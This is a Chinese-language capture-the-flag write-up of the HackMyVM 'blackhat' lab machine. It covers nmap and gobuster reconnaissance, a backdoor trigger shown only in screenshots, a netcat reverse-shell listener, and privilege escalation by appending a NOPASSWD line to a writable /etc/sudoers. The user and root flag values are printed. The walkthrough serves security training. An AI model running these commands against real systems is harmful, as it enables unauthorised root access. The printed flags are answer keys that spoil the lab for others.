# 信息搜集

主机发现

```
┌──(kali㉿kali)-[~]
└─$ nmap -sn 192.168.21.0/24
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 01:26 EDT
Nmap scan report for 192.168.21.1
Host is up (0.0036s latency).
MAC Address: CC:E0:DA:EB:34:A2 (Baidu Online Network Technology (Beijing))
Nmap scan report for 192.168.21.4
Host is up (0.00014s latency).
MAC Address: 04:6C:59:BD:33:50 (Intel Corporate)
Nmap scan report for 192.168.21.5
Host is up (0.091s latency).
MAC Address: 72:10:25:EC:4F:8C (Unknown)
Nmap scan report for 192.168.21.13
Host is up (0.00031s latency).
MAC Address: 08:00:27:7F:39:59 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.21.10
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.65 seconds
```

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ nmap --min-rate 10000 -p- 192.168.21.13
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 01:26 EDT
Nmap scan report for 192.168.21.13
Host is up (0.00040s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:7F:39:59 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.68 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sU --min-rate 10000 -p- 192.168.21.13
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 01:27 EDT
Warning: 192.168.21.13 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.21.13
Host is up (0.0013s latency).
All 65535 scanned ports on 192.168.21.13 are in ignored states.
Not shown: 65457 open|filtered udp ports (no-response), 78 closed udp ports (port-unreach)
MAC Address: 08:00:27:7F:39:59 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 72.87 seconds
                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -sT -sV -O -p80 192.168.21.13        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-11 01:28 EDT
Nmap scan report for 192.168.21.13
Host is up (0.00028s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
MAC Address: 08:00:27:7F:39:59 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.67 seconds
```

# 漏洞利用

看一下80端口

```
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.21.13/
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Hacked By HackMyVM</title>
    <link rel="stylesheet" href="./style.css">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script>
document.onkeydown = function(e) {
        if (e.ctrlKey && 
            (e.keyCode === 67 || 
             e.keyCode === 86 || 
             e.keyCode === 85 || 
             e.keyCode === 117)) {
            return false;
        } else {
            return true;
        }
};
$(document).keypress("u",function(e) {
  if(e.ctrlKey)
  {
return false;
}
else
{
return true;
}
});
</script>
<body oncontextmenu="return false;" >
</head>

<body>
    <div class="mainContainer">
    <div style="display:none;">check backboor</div>

        <div class="img">
            <img class="mainImage" src="./image.jpg" alt="image">
        </div>
        <h1> Hacked By HackMyVM team</h1>
        <hr class="hr">

        <div class="container">
            <h2 class="teamName"> <span> Defaced </h2>
            <p class="text1">
                #hackmyvm #cybersecurity #infosec #ctf #pentest 
            </p>

            <textarea name="textbox" class="textbox" cols="50" rows="1">
https://hackmyvm.eu/
            </textarea>


        </div>
    </div>
</body>

</html>
```

![image](https://github.com/user-attachments/assets/c9fa7d86-7792-4ac1-bf1e-d42028e4ae5b)

端口扫描

```
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.21.13/ -w SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x html,txt,php,jpg,png,zip,git
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.21.13/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              png,zip,git,html,txt,php,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 1437]
/image.jpg            (Status: 200) [Size: 13314]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/phpinfo.php          (Status: 200) [Size: 69331]
/server-status        (Status: 403) [Size: 278]
/logitech-quickcam_w0qqcatrefzc5qqfbdz1qqfclz3qqfposz95112qqfromzr14qqfrppz50qqfsclz1qqfsooz1qqfsopz1qqfssz0qqfstypez1qqftrtz1qqftrvz1qqftsz2qqnojsprzyqqpfidz0qqsaatcz1qqsacatzq2d1qqsacqyopzgeqqsacurz0qqsadisz200qqsaslopz1qqsofocuszbsqqsorefinesearchz1.html (Status: 403) [Size: 278]
Progress: 9482032 / 9482040 (100.00%)
===============================================================
Finished
===============================================================
```

/phpinfo

![image](https://github.com/user-attachments/assets/81c3099c-a714-4c69-ae3d-6e6f3d799ba9)

![image](https://github.com/user-attachments/assets/6fcb6deb-2519-4482-918d-8611c4bd9832)

成功触发

![image](https://github.com/user-attachments/assets/82f3f474-d86b-4d3e-88ae-c336660c23eb)

反弹一个shell

![image](https://github.com/user-attachments/assets/cddadd01-3c78-4684-8340-c26eeed1ae62)

```
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.21.10] from (UNKNOWN) [192.168.21.13] 40848
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# 权限提升

看一下都有什么

```
www-data@blackhat:/var/www/html$ ls -la  
ls -la
total 36
drwxr-xr-x 2 root     root      4096 Nov 19  2022 .
drwxr-xr-x 3 root     root      4096 Nov 10  2022 ..
-rw-r--r-- 1 www-data www-data 13314 Nov 11  2022 image.jpg
-rw-r--r-- 1 www-data www-data  1437 Nov 19  2022 index.html
-rw-r--r-- 1 www-data www-data    20 Nov 11  2022 phpinfo.php
-rw-r--r-- 1 www-data www-data  2332 Nov 11  2022 style.css
www-data@blackhat:/var/www/html$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

Sorry, try again.
[sudo] password for www-data: 

sudo: 3 incorrect password attempts
www-data@blackhat:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
www-data@blackhat:/var/www/html$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
www-data@blackhat:/var/www/html$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
darkdante:x:1000:1000:,,,:/home/darkdante:/bin/bash
www-data@blackhat:/var/www/html$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

找了很久，结果直接su就行。。。。

```
www-data@blackhat:/var/www/html$ su darkdante
su darkdante
darkdante@blackhat:/var/www/html$
```

看一看darkdante下有什么

```
darkdante@blackhat:~$ ls -la
ls -la
total 28
drwxr-xr-x 3 darkdante darkdante 4096 Nov 13  2022 .
drwxr-xr-x 3 root      root      4096 Nov 11  2022 ..
lrwxrwxrwx 1 root      root         9 Nov 11  2022 .bash_history -> /dev/null
-rw-r--r-- 1 darkdante darkdante  220 Nov 11  2022 .bash_logout
-rw-r--r-- 1 darkdante darkdante 3526 Nov 11  2022 .bashrc
drwxr-xr-x 3 darkdante darkdante 4096 Nov 11  2022 .local
-rw-r--r-- 1 darkdante darkdante  807 Nov 11  2022 .profile
-rwx------ 1 darkdante darkdante   33 Nov 11  2022 user.txt
darkdante@blackhat:~$ sudo -l
sudo -l
Sorry, user darkdante may not run sudo on blackhat.
darkdante@blackhat:~$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
darkdante@blackhat:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
```

user

```
darkdante@blackhat:~$ cat user.txt
cat user.txt
89fac491dc9bdc5fc4e3595dd396fb11
```

上传一下linpeas看一下

```
╔══════════╣ Readable files belonging to root and readable by me but not world readable                                         
-r--rw----+ 1 root root 669 Nov 19  2022 /etc/sudoers
```

提权

```
darkdante@blackhat:~$ echo 'darkdante ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
<'darkdante ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
darkdante@blackhat:~$ sudo -l
sudo -l
Matching Defaults entries for darkdante on blackhat:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User darkdante may run the following commands on blackhat:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: ALL
darkdante@blackhat:~$ sudo /bin/bash
sudo /bin/bash
root@blackhat:/home/darkdante# id
id
uid=0(root) gid=0(root) groups=0(root)
```

root

```
root@blackhat:~# cat root.txt
cat root.txt
8cc6110bc1a0607015c354a459468442
```
